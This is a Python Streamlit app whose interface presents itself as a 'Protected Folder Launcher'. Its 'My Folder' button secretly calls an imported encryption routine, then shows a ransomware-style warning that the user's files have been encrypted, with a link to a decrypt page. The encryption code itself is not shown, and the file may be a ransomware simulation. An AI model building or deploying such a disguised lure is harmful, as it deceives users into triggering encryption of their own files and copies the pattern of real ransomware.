import streamlit as st
from encrypt import run_encryption

st.set_page_config(page_title="🔐 Secure Folder Access", layout="centered", initial_sidebar_state="collapsed")
st.title("📁 Protected Folder Launcher")

st.markdown("""
    <style>
    body, .stApp {
        background-color: black;
        color: #FFFFF0;
        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    }

    h1 {
        color: #FFFFF0;
    }

    .stButton button {
        background-color: black;
        color: white;
        border: 2px solid #000000;
        border-radius: 6px;
        padding: 10px 25px;
        font-size: 16px;
        transition: background-color 0.3s ease;
    }

    .stButton button:hover {
        background-color: #111111;
        border-color: #CCCCCC;
    }

    .stAlert {
        color: #FFFFF0;
    }

    h2 {
        color: red !important;
    }

    a {
        color: white !important;
        text-decoration: none;
    }
    a:hover {
        text-decoration: underline;
        color: #cccccc !important;
    }
    </style>
""", unsafe_allow_html=True)

st.markdown("Click below to access your folder:", unsafe_allow_html=True)

if st.button("📂 My Folder"):
    run_encryption()
    st.info("No files found.")
    st.markdown("""
    <h2>⚠️ YOUR FILES HAVE BEEN ENCRYPTED!</h2>
    <p style='font-size:18px;'>Your files are currently inaccessible.</p>
    <p style='font-size:18px;'>Click below to Decrypt:</p>
    """, unsafe_allow_html=True)
    
    st.page_link("pages/Decrypt_folder.py", label="Decrypt your folder")
